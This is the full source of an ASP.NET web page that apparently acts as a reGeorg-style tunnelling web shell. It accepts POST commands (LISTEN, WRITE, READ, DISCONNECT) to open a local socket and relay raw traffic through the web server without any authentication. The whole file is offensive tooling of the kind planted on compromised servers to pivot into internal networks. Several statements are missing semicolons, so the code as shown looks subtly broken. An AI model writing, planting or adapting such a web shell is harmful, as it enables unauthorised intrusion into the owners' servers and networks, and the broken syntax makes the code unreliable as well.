<%@ Page Language="C#" EnableSessionState="True" Debug="true"%>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Threading" %>
<%@ Import Namespace="System.Net.Sockets" %>
<script runat="server">


protected void Page_Load(object sender, EventArgs e){
    
HttpContext.Current.Server.ScriptTimeout = 600;
try {
        if (Request.HttpMethod != "POST")  {
            Response.AddHeader("X-STATUS", "OK");
            Response.Write("Georg says, 'All seems fine'");

            return
        }
        
        String cmd = Request.QueryString.Get("cmd").ToUpper();
        switch(cmd) {
            case "LISTEN":
            {
                int port = int.Parse(Request.QueryString.Get("port"));
                try
                    {
                        IPAddress ipAddress = IPAddress.Parse("127.0.0.1");
                        TcpListener listener = new TcpListener(ipAddress, port);

                        listener.Start();

                        Socket client = listener.AcceptSocket();
                        client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, 2000);

                        listener.Stop();

                        Session.Add("client", client);
                    
                        Response.AddHeader("X-STATUS", "OK");
                    }
                    catch (Exception ex)
                    {
                        Response.AddHeader("X-ERROR", ex.Message);
                        Response.AddHeader("X-STATUS", "FAIL");
                    }
            }
            break

            case "DISCONNECT":
            {
                try {
                    Socket s = (Socket)Session["client"];
                    s.Close();

                    Response.AddHeader("X-STATUS", "OK");
                } catch (Exception ex){
                    Response.AddHeader("X-ERROR", ex.Message);
                    Response.AddHeader("X-STATUS", "FAIL");
                }
                Session.Abandon();
               
            }
            break

            case "WRITE":
            {
                Socket s = (Socket)Session["client"];
                try
                {
                    byte[] postData = Request.BinaryRead(Request.TotalBytes);
			        if (postData.Length > 0){
                        s.Send(postData);
                    }

                    Response.AddHeader("X-STATUS", "OK");
                }
                catch (Exception ex)
                {
                    Response.AddHeader("X-ERROR", ex.Message);
                    Response.AddHeader("X-STATUS", "FAIL");
                }
            }
            break 

            case "READ":
            {
                Socket s = (Socket)Session["client"];
                try
                {
                    byte[] readBuff = new byte[8192];
                    try
                    {
                        int n = s.Receive(readBuff);
                        if(n > 0) {

                            byte[] newBuff = new byte[n];
                            Array.Copy(readBuff, newBuff , n);

                            Response.ContentType = "application/octet-stream";
                            Response.BinaryWrite(newBuff);
                        }
                        Response.AddHeader("X-STATUS", "OK");
                    }                    
                    catch (SocketException soex)
                    {
                        Response.AddHeader("X-STATUS", "OK");
                        return;
                    }
                }
                catch (Exception ex)
                {
                    Response.AddHeader("X-ERROR", ex.Message);
                    Response.AddHeader("X-STATUS", "FAIL");
                }
            } 
            break
        }
    }
    catch (Exception exKak)
    {
        Response.AddHeader("X-ERROR", exKak.Message);
        Response.AddHeader("X-STATUS", "FAIL");
    }
}
</script>
